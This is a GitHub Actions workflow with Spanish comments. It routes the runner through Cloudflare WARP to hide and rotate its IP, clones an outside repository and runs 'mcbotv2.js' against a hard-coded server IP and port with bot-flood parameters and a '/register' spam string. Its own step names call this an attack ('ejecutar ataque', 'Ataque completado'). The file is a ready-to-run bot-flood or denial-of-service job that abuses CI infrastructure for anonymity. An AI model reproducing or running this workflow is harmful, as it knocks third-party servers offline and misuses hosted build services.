name: Ata1a
on:
  workflow_dispatch:

jobs:
  anak:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    
    steps:
      - name: Instalar y conectar Cloudflare Warp
        run: |
          # Instalar dependencias
          sudo apt-get update -y
          sudo apt-get install -y lsb-release curl
          
          # Agregar repositorio de Warp
          curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor -o /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
          echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
          
          # Instalar Warp
          sudo apt-get update -y
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y cloudflare-warp
          
          # Iniciar servicio
          sudo warp-svc &
          sleep 5
          
          # Registrar y conectar
          echo y | sudo warp-cli --accept-tos registration new || true
          sudo warp-cli --accept-tos connect
          sudo warp-cli --accept-tos mode warp+doh
          
          # Mostrar IP
          echo "========================================="
          echo "IP CON WARP ACTIVADO:"
          curl -s https://api.ipify.org
          echo ""
          curl -s https://ipinfo.io/ip
          echo "========================================="
          
      - name: Clonar repositorio
        run: |
          git clone https://github.com/ricardocraft121-gif/ssh2.git
          
      - name: Entrar y ejecutar ataque
        run: |
          cd ssh2
          timeout 25 node mcbotv2.js 45.126.208.51 25590 13444 15 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
          
      - name: Limpiar
        if: always()
        run: |
          echo "✅ Ataque completado después de 25 segundos"
          echo "La IP rotará en el próximo workflow"
          sleep 2
